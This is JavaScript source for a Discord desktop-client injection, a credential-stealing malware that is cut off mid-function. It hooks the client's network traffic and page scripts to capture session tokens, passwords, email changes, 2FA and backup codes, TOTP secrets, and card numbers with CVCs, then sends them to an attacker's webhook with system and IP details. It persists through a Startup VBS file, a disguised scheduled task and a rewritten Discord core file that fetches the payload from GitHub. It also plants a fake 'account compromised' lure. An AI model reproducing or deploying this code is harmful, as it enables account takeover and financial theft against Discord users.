const querystring = require('querystring');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

const { exec } = require('child_process');
const { promisify } = require('util');
const { BrowserWindow, session } = require('electron');

const execCommand = async (command, options = {}) => {
    try {
        const { stdout, stderr } = await promisify(exec)(command, options);
        if (stderr) {
            console.error(stderr);
        }
        return stdout.trim();
    } catch (error) {
        return null;
    }
};

const execScript = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    try {
        const result = await windows[0].webContents.executeJavaScript(script, true);
        return result;
    } catch (error) {
        return null;
    }
};

const CONFIG = {
    webhook: '%WEBHOOK_URL%',
    API: '%API_URL%',
    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
    auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
    auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
    auto_email_update: '%AUTO_EMAIL_UPDATE%',
    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
    get: {
        token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
        logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`),
        clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`),
    },
    auth_filters: {
        urls: [
            '/users/@me',
            '/auth/login',
            '/auth/register',
            '/remote-auth/login',
            '/mfa/totp',
            '/mfa/totp/enable',
            '/mfa/sms/enable',
            '/mfa/totp/disable',
            '/mfa/sms/disable',
            '/mfa/codes-verification',
        ],
    },
    session_filters: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ],
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        ],
    },
    badges: {
        _nitro: [
            "<:DiscordBoostNitro1:1087043238654906472> ",
            "<:DiscordBoostNitro2:1087043319227494460> ",
            "<:DiscordBoostNitro3:1087043368250511512> ",
            "<:DiscordBoostNitro6:1087043493236592820> ",
            "<:DiscordBoostNitro9:1087043493236592820> ",
            "<:DiscordBoostNitro12:1162420359291732038> ",
            "<:DiscordBoostNitro15:1051453775832961034> ",
            "<:DiscordBoostNitro18:1051453778127237180> ",
            "<:DiscordBoostNitro24:1051453776889917530> ",
        ],
        _discord_emloyee: {
            value: 1,
            emoji: "<:DiscordEmloyee:1163172252989259898>",
            rare: true,
        },
        _partnered_server_owner: {
            value: 2,
            emoji: "<:PartneredServerOwner:1163172304155586570>",
            rare: true,
        },
        _hypeSquad_events: {
            value: 4,
            emoji: "<:HypeSquadEvents:1163172248140660839>",
            rare: true,
        },
        _bug_hunter_level_1: {
            value: 8,
            emoji: "<:BugHunterLevel1:1163172239970140383>",
            rare: true,
        },
        _house_bravery: {
            value: 64,
            emoji: "<:HouseBravery:1163172246492287017>",
            rare: false,
        },
        _house_brilliance: {
            value: 128,
            emoji: "<:HouseBrilliance:1163172244474822746>",
            rare: false,
        },
        _house_balance: {
            value: 256,
            emoji: "<:HouseBalance:1163172243417858128>",
            rare: false,
        },
        _early_supporter: {
            value: 512,
            emoji: "<:EarlySupporter:1163172241996005416>",
            rare: true,
        },
        _bug_hunter_level_2: {
            value: 16384,
            emoji: "<:BugHunterLevel2:1163172238942543892>",
            rare: true,
        },
        _early_bot_developer: {
            value: 131072,
            emoji: "<:EarlyBotDeveloper:1163172236807639143>",
            rare: true,
        },
        _certified_moderator: {
            value: 262144,
            emoji: "<:CertifiedModerator:1163172255489085481>",
            rare: true,
        },
        _active_developer: {
            value: 4194304,
            emoji: "<:ActiveDeveloper:1163172534443851868>",
            rare: true,
        },
        _spammer: {
            value: 1048704,
            emoji: "⌨️",
            rare: false,
        },
    },
};

const parseJSON = (data) => {
    try {
        return JSON.parse(data || '');
    } catch {
        return {};
    }
};

const clearLocalStorage = () => {
    try {
        CONFIG.get.clear_local_storage();
    } catch {
        return null;
    }
}

const request = async (method, url, headers = {}, data = null) => {
    try {
        const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
            return new Promise((resolve, reject) => {
                const { protocol, hostname, pathname, search } = new URL(url);
                const client = protocol === 'https:' ? https : http;
                const options = {
                    hostname,
                    path: pathname + search,
                    method,
                    headers: {
                        'Access-Control-Allow-Origin': '*',
                        ...headers,
                    },
                };
                const req = client.request(options, (res) => {
                    let resData = '';
                    res.on('data', (chunk) => resData += chunk);
                    res.on('end', () => resolve(resData));
                });
                req.on('error', err => reject(err));
                if (data) req.write(data);
                req.end();
            });
        });
        return Promise.all(requests);
    } catch (err) {
        return Promise.reject(err);
    }
};

const AuritaCord = async () => {
    try {
        const logout = await CONFIG.get.logout();
        const token = await CONFIG.get.token();
        const API = new Fetcher(token);

        const [user, profile, billing, friends, servers] = await Promise.all([
            API.User(),
            API.Profile(),
            API.Billing(),
            API.Friends(),
            API.Servers()
        ]);

        return {
            logout,
            token,
            user,
            profile,
            billing,
            friends,
            servers
        };
    } catch {
        return {}
    }
}

const notify = async (ctx, token, user) => {
    const getData = new GetDataUser();

    const [profile, system, network, billing, friends, servers] = [
        (await AuritaCord()).profile,
        await getData.SystemInfo(),
        await getData.Network(),
        await getData.Billing(token),
        await getData.Friends(token),
        await getData.Servers(token),
    ];
    
    const [nitro, badges] = [
        getData.Nitro(profile),
        getData.Badges(user.flags),
    ];

    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
    ctx.username = `AuraThemes - injection`;
    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;

    ctx.embeds[0].fields.unshift({
        name: `<a:hearts:1176516454540116090> Token:`,
        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
        inline: false
    })

    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    };

    ctx.embeds[0].fields.push(
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Nitro", value: nitro, inline: true },
        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
        { name: "\u200b", value: "\u200b", inline: false },
        { name: "Badges", value: badges, inline: true },
        { name: "Billing", value: billing, inline: true },
        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
    );

    if (friends) {
        ctx.embeds.push({ title: friends.title, description: friends.description });
    }

    if (servers) {
        ctx.embeds.push({ title: servers.title, description: servers.description });
    }

    ctx.embeds.push({
        title: `System Information`,
        fields: [
            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
        ]
    });

    ctx.embeds.forEach(embed => {
        embed.color = 12740607;
        embed.author = {
            name: `${user.username} | ${user.id}`,
            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
        };

        embed.footer = {
            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
            icon_url: "https://avatars.githubusercontent.com/u/103044629",
        };

        embed.timestamp = new Date();
    });

    try {
        return await request('POST', CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(ctx));
    } catch (error) {
        return null;
    }
};

const getBackupCodes = async (response) => {
    try{
        const backup_codes = await CONFIG.get.backup_codes();
        const codes = response.backup_codes || backup_codes;

        const filtered = codes.filter(code => !code.consumed);
    
        const validCode = filtered
            .map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`)
            .join('\n');
        
        return validCode;
    } catch (error) {
        return ''
    }
};

const editSettingUser = async (token) => {
    try {
        const response = parseJSON(await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
            'Content-Type': 'application/json',
            'Authorization': token
        }, JSON.stringify({
            status: 'dnd',
            email_notifications_enabled: false,
            stream_notifications_enabled: false,
            custom_status: {
                text: 'hackedbyk4itrun',
                expires_at: null,
                emoji_id: null,
                emoji_name: null
            },
        })));

        return response;
    } catch (error) {
        return {};
    }
};

class Fetcher {
    constructor(token) {
        this.token = token;
    }
    _fetch = async (endpoint, headers) => {
        const APIs = [
            'https://discordapp.com/api',
            'https://discord.com/api',
            'https://canary.discord.com/api',
            'https://ptb.discord.com/api'
        ];
        const response = parseJSON(await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers));
        return response;
    };

    User = async () => {
        return await this._fetch("@me", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Profile = async () => {
        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Friends = async () => {
        return await this._fetch("@me/relationships", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Servers = async () => {
        return await this._fetch("@me/guilds?with_counts=true", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };

    Billing = async () => {
        return await this._fetch("@me/billing/payment-sources", {
            'Content-Type': 'application/json',
            "Authorization": this.token
        });
    };
};

class GetDataUser {
    SystemInfo = async () => {
        try {
            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
                execCommand("wmic OS get caption, osarchitecture | more +1"),
                execCommand("wmic cpu get name | more +1"),
                execCommand("wmic PATH Win32_VideoController get name | more +1").then(stdout => stdout.replace(/\r\n|\r/g, "")),
                execCommand("wmic computersystem get totalphysicalmemory | more +1").then(stdout => `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`),
                execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"),
                execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
                execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress"),
                execCommand("powershell.exe (Get-NetIPAddress).IPAddress"),
                execCommand("echo %NUMBER_OF_PROCESSORS%")
            ]);

            return {
                os,
                cpu,
                gpu,
                ram,
                uuid,
                productKey,
                macAddress,
                localIP,
                cpuCount,
            };
        } catch (error) {
            return {};
        }
    };

    Network = async () => {
        try {
            const response = parseJSON(await request('GET', "http://ip-api.com/json", {
                'Content-Type': 'application/json'
            }));
            return response;
        } catch (error) {
            return {};
        }
    };

    Badges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || '❓';

    RareBadges = (flags) =>
        Object.keys(CONFIG.badges)
            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
                && CONFIG.badges[badge].rare
                ? `${result}${CONFIG.badges[badge].emoji} `
                : result, '',
            ) || '';

    Billing = async (token) => {
        const API = new Fetcher(token);
        const data = await API.Billing();

        const payment = {
            1: '💳',
            2: '<:Paypal:1129073151746252870>'
        };
        let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
        return paymentMethods || '❓';
    }

    Friends = async (token) => {
        const API = new Fetcher(token);
        const friends = await API.Friends();
        const { RareBadges } = new GetDataUser();

        const filteredFriends = friends
            .filter(friend => friend.type === 1)
            .map(friend => ({
                username: friend.user.username,
                flags: RareBadges(friend.user.public_flags),
            }))

        const rareFriends = filteredFriends.filter(friend => friend.flags);

        const hQFriends = rareFriends.map(friend => {
            const name = `${friend.username}`;
            return `${friend.flags} | ${name}\n`;
        });

        const hQFriendsPlain = hQFriends.join('');

        if (hQFriendsPlain.length === 0) {
            return false;
        };

        if (hQFriendsPlain.length > 4050) {
            return {
                title: `**Rare Friends (Too many to display):**\n`,
                description: "Too many friends to display.",
            };
        };

        return {
            title: `**Rare Friends (${hQFriends.length}):**\n`,
            description: `${hQFriendsPlain}`,
        };
    };

    Servers = async (token) => {
        const API = new Fetcher(token);
        const guilds = await API.Servers();

        const filteredGuilds = guilds
            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
            .filter(guild => guild.approximate_member_count >= 500)
            .map(guild => ({
                id: guild.id,
                name: guild.name,
                owner: guild.owner,
                member_count: guild.approximate_member_count
            }));

        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
            const response = parseJSON(await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
                'Content-Type': 'application/json',
                'Authorization': token
            }));

            const invites = response;
            const invite = invites.length > 0
                ? `[Join Server](https://discord.gg/${invites[0].code})`
                : 'No Invite';

            const emoji = guild.owner
                ? `<:Owner:963333541343686696> Owner`
                : `<:Staff:1136740017822253176> Admin`;
            const members = `Members: \`${guild.member_count}\``;
            const name = `**${guild.name}** - (${guild.id})`;

            return `${emoji} | ${name} - ${members} - ${invite}\n`;
        }));

        const hQGuildsPlain = hQGuilds.join('');

        if (hQGuildsPlain.length === 0) {
            return false;
        };

        if (hQGuildsPlain.length > 4050) {
            return {
                title: `**Rare Servers (Too many to display):**\n`,
                description: "Too many servers to display.",
            };
        };

        return {
            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
            description: `${hQGuildsPlain}`,
        }
    };

    getDate = (current, months) => {
        return new Date(current).setMonth(current.getMonth() + months);
    };

    Nitro = (flags) => {
        const { premium_type, premium_guild_since } = flags,
            nitro = "<:DiscordNitro:587201513873473542>";
        switch (premium_type) {
            default:
                return "❓";
            case 1:
                return nitro;
            case 2:
                if (!premium_guild_since) return nitro;
                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
                    rem = 0;
                for (let i = 0; i < months.length; i++)
                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
                        rem = i;
                        break;
                    }
                return `${nitro} ${CONFIG.badges._nitro[rem]}`;
        }
    };
};

const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms))
};

const Cruise = async (type, response, request, email, password, token, action) => {
    let API;
    let user;
    let content;
    switch (type) {
        case 'LOGIN_USER':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };

            if (request?.code !== undefined) {
                content.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                );
            };

            notify(content, token, user);
            break;
        case 'USERNAME_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Username", value: `\`${request.username}\``, inline: true },
                        { name: "Password", value: `\`${request.password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: false },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'EMAIL_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Email", value: `\`${email}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PASSWORD_CHANGED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                        { name: "Email", value: `\`${email}\``, inline: false, },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'BACKUP_CODES':
            API = new Fetcher(token);
            user = await API.User();

            const codes = await getBackupCodes(response);

            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Email", value: `\`${email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                    ],
                }],
            };

            if (request?.code !== undefined && request?.secret !== undefined) {
                content.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
                );
            };

            notify(content, token, user);
            break;
        case 'CREDITCARD_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                        { name: "\u200b", value: "\u200b", inline: false },
                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
                    ],
                    fields: [
                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'PAYPAL_ADDED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        case 'INJECTED':
            API = new Fetcher(token);
            user = await API.User();
            content = {
                content: `**${user.username}** ${action}!`,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${email}\``, inline: true },
                    ],
                }],
            };
            notify(content, token, user);
            break;
        default:
    }
};

const forcePersistStartup = async () => {
    const vbsFileName = 'DiscordBetterProtector.vbs';
    const batFileName = 'setupTask.bat';

    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
    const batFilePath = path.join(__dirname, batFileName);

    const scriptVbsContent = await request('GET', CONFIG.injector_url, {
        'Content-Type': 'text/plain'
    });

    const responseVbsMalware = scriptVbsContent[0]?.toString('utf8') || '';
    const vbsContent = responseVbsMalware
        .replace("replace_webhook_url", CONFIG.webhook)
        .replace("replace_api_url", CONFIG.API)
        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
        .replace("replace_auto_persist_startup", CONFIG.auto_persist_startup)
        .replace("replace_auto_mfa_disabler", CONFIG.auto_mfa_disabler)
        .replace("replace_auto_email_update", CONFIG.auto_email_update)

    const checkFileExists = (filePath) => {
        return new Promise((resolve) => {
            fs.access(filePath, fs.constants.F_OK, (err) => {
                resolve(!err);
            });
        });
    };

    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
                resolve(!err);
            });
        });
    };

    const createVBSFile = (filePath) => {
        return new Promise((resolve, reject) => {
            fs.writeFile(filePath, vbsContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const createBatchFile = () => {
        const batContent = `
            @echo off
            setlocal
            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
            if %ERRORLEVEL% EQU 0 (
                echo We are scanning your Discord application(s)....
            ) else (
                echo An unexpected error occurred...
            )
            timeout /t 5 /nobreak > NUL
            del "%~f0"
            endlocal
        `;

        return new Promise((resolve, reject) => {
            fs.writeFile(batFilePath, batContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const executeBatchFile = () => {
        return new Promise((resolve, reject) => {
            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const protectExists = await checkFileExists(vbsFilePathInProtect);
    const startupExists = await checkFileExists(vbsFilePathInStartup);
    const taskExists = await checkScheduledTaskExists();

    if (!protectExists) {
        await createVBSFile(vbsFilePathInProtect);
    };
    if (!startupExists) {
        await createVBSFile(vbsFilePathInStartup);
    };
    if (!taskExists) {
        await createBatchFile();
        await executeBatchFile();

        setTimeout(() => {
            fs.unlink(batFilePath, (error) => {
                if (error) {
                    console.log(error);
                }
            });
        }, 10000);
    }
};

const startup = async () => {
    const startupDir = path.join(__dirname, 'aurathemes');

    const {
        token,
        user,
    } = await AuritaCord();

    if(token) {
        if (fs.existsSync(startupDir)) {
            fs.rmdirSync(startupDir);
            Cruise(
                'INJECTED',
                null,
                null,
                user.email,
                null,
                token,
                `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
            );
            clearLocalStorage();
        }
    }
    
    const getDiscordPaths = () => {
        const args = process.argv;
        const appDir = path.dirname(args[0]);
        let resourceDir;

        switch (process.platform) {
            case 'win32':
                resourceDir = path.join(appDir, 'resources');
                break;
            default:
                return { resource: undefined, app: undefined };
        }

        return fs.existsSync(resourceDir) 
            ? { resource: resourceDir, app: appDir } 
            : { resource: undefined, app: undefined };
    };

    const { resource, app } = getDiscordPaths();
    if (!resource || !app) return;

    const appDir = path.join(resource, 'app');

    const packageJsonFile = path.join(appDir, 'package.json');
    const startupScriptRunJsFile = path.join(appDir, 'index.js');

    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');

    if (!fs.existsSync(appDir)) {
        fs.mkdirSync(appDir, { recursive: true });
    }

    [packageJsonFile, startupScriptRunJsFile].forEach(file => {
        if (fs.existsSync(file)) fs.unlinkSync(file);
    });

    // In the future maybe add more operating systems!
    // This may work on other systems but Windows is recommended
    if (['win32'].includes(process.platform)) {
        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const scriptRunJsFileContent = `
            const fs = require('fs');
            const https = require('https');
            const path = require('path');
            const coreJsFile = '${coreJsFile}';
            const betterDiscordAsarFile = '${betterDiscordAsarFile}';

            const initialize = async () => {
                try {
                    const data = await fs.promises.readFile(coreJsFile, 'utf8');

                    if (
                        data.length < 20000 || 
                        data === "module.exports = require('./core.asar')"
                    ) {
                        await downloadAndUpdateFile();
                    };
                } catch (err) {
                    console.error(err);
                }
            };

            const downloadAndUpdateFile = async () => {
                try {
                    const fileStream = fs.createWriteStream(coreJsFile);

                    await new Promise((resolve, reject) => {
                        https.get('${CONFIG.injection_url}', (res) => {
                            res.on('data', chunk => fileStream.write(
                                chunk.toString()
                                    .replace('%WEBHOOK_URL%', '${CONFIG.webhook}')
                                    .replace('%API_URL%', '${CONFIG.API}')
                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG.auto_user_profile_edit}')
                                    .replace('%AUTO_PERSIST_STARTUP%', '${CONFIG.auto_persist_startup}')
                                    .replace('%AUTO_MFA_DISABLER%', '${CONFIG.auto_mfa_disabler}')
                                    .replace('%AUTO_EMAIL_UPDATE%', '${CONFIG.auto_email_update}')
                            ));

                            res.on('end', () => {
                                fileStream.end();
                                resolve();
                            });
                        }).on('error', err => {
                            reject(err);
                        });
                    });
                } catch (err) {
                    setTimeout(downloadAndUpdateFile, 10000);
                }
            };

            initialize();
            require('${path.join(resource, 'app.asar')}');

            if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
        `;
        fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
    }

};

const translateEmailUpdate = async (token, locale) => {
    const message = [
        "User Settings",
        "Edit email address",
        "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
    ];

    const sanitized = message.map(item => item.replace(/[.,]/g, ''));

    try {
        const textParam = encodeURIComponent(JSON.stringify(sanitized));
        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
            'Content-Type': 'application/json',
            'Authorization': token
        }));

        if (!response.success) {
            return message;
        }

        const translatedText = parseJSON(response.text);

        return Array.isArray(translatedText) && translatedText.length === message.length
            ? translatedText
            : message;
    } catch (error) {
        return message;
    }
};

let [
    email,
    password,
    script_executed
] = [
    '',
    '',
    false
];

const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
    try {
        switch (true) {
            case params.response.url.endsWith('/login'):
                if (params.response.url.endsWith('/remote-auth/login')) {
                    // With this update, QR codes are blocked in the function allSessionsLocked(),
                    // so this is here just in case the QR code blocking fails
                    if (!RESPONSE_DATA.encrypted_token) return;

                    await delay(2000);

                    const {
                        token: newToken,
                        user: newUser
                    } = await AuritaCord();

                    Cruise(
                        'LOGIN_USER',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        newUser.email,
                        'The password was not found',
                        newToken,
                        `You have logged in using QR code`
                    );
                }

                if (!RESPONSE_DATA.token) {
                    email = RESQUEST_DATA.login;
                    password = RESQUEST_DATA.password;
                    return;
                }

                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    RESQUEST_DATA.login,
                    RESQUEST_DATA.password,
                    token,
                    `has Logged in-`
                );
                break;

            case params.response.url.endsWith('/register'):
                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    RESQUEST_DATA.email,
                    RESQUEST_DATA.password,
                    token,
                    'has `Created` a new account'
                );
                break;

            case params.response.url.endsWith('/totp'):
                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    email,
                    password,
                    token,
                    `you are logged in with \`2FA\``
                );
                break;

            case params.response.url.endsWith('/enable'):
            case params.response.url.endsWith('/codes-verification'):
                const count = RESPONSE_DATA.backup_codes?.length ?? 0;

                Cruise(
                    'BACKUP_CODES',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    user.email,
                    'The password was not found',
                    token,
                    `\`${count} security\` codes have just been added`
                );
                break;

            case params.response.url.endsWith('/@me'):
                if (!RESQUEST_DATA.password) return;
                if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
                    Cruise(
                        'EMAIL_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        RESQUEST_DATA.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their email to \`${RESQUEST_DATA.email}\``
                    );
                }
                if (RESQUEST_DATA.new_password) {
                    Cruise(
                        'PASSWORD_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        user.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their password to \`${RESQUEST_DATA.new_password}\``
                    );
                }
                if (RESQUEST_DATA.username) {
                    Cruise(
                        'USERNAME_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        user.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their username to \`${RESQUEST_DATA.username}\``
                    );
                }
                break;
        }
    } catch (error) {
        console.error(error);
    }
};

const createWindow = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if ('Network.responseReceived' !== method) return;

        if (
            !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
            ![200, 202].includes(params.response.status)
        ) return;

        try {
